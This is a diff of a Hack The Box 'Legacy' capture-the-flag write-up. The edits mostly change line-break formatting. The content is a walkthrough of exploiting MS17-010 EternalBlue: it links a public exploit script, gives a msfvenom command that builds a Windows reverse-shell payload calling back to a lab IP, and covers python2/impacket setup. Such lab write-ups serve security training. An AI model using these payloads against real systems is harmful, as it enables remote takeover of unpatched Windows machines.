@@ -11,12 +11,6 @@ jupyter: python3
 toc: true
 ---
 
-![](images/legacy_logo.png){: style="float: right; width: 200px; margin-left: 2em"}
-
-N/A<br><br><br><br><br><br><br>
-
-----------------
-
 # USER
 ## Enumeration
 
@@ -85,8 +79,10 @@ N/A<br><br><br><br><br><br><br>
 
 **MS17-010** EternalBlue is the obvious attack path here, lets exploit it.
 
-**a)** Download the script [**`send_and_execute.py`**](https://github.com/helviojunior/MS17-010)<br>
-**b)** Create your malicious payload:<br>
+**a)** Download the script [**`send_and_execute.py`**](https://github.com/helviojunior/MS17-010)
+
+**b)** Create your malicious payload:
+
     `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4488 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`
 
 **c)** Execute!
@@ -98,14 +94,22 @@ N/A<br><br><br><br><br><br><br>
   ImportError: No module named impacket
 ```
 
-**d)** If you get the error like above, it's because your python2 version is to new.<br>
-: **d1)** uninstall pip3: `sudo apt-get remove python3-pip`<br>
-  **d2)** Get pip3 installer: `curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py`<br>
-  **d3)** Install pip3: `python3 get-pip.py`<br>
-  **d4)** Get pip2 installer: `curl https://bootstrap.pypa.io/2.7/get-pip.py -o get-pip.py`<br>
-  **d5)** Install pip2: `python get-pip.py`<br>
-  **d6)** Now you can install any pip2 modules: `pip install impacket`<br>
-  **d7)** Make sure your python and python-pip are compatible. Python version 2.7.18 and pip 20.3.4 is preffered.<br>
+**d)** If you get the error like above, it's because your python2 version is to new.
+
+: **d1)** uninstall pip3: `sudo apt-get remove python3-pip`
+
+  **d2)** Get pip3 installer: `curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py`
+
+  **d3)** Install pip3: `python3 get-pip.py`
+
+  **d4)** Get pip2 installer: `curl https://bootstrap.pypa.io/2.7/get-pip.py -o get-pip.py`
+
+  **d5)** Install pip2: `python get-pip.py`
+
+  **d6)** Now you can install any pip2 modules: `pip install impacket`
+
+  **d7)** Make sure your python and python-pip are compatible. Python version 2.7.18 and pip 20.3.4 is preffered.
+
 
 ```bash
 [root:/git/htb/legacy]# python -m pip -V                                                                                          (master✱)
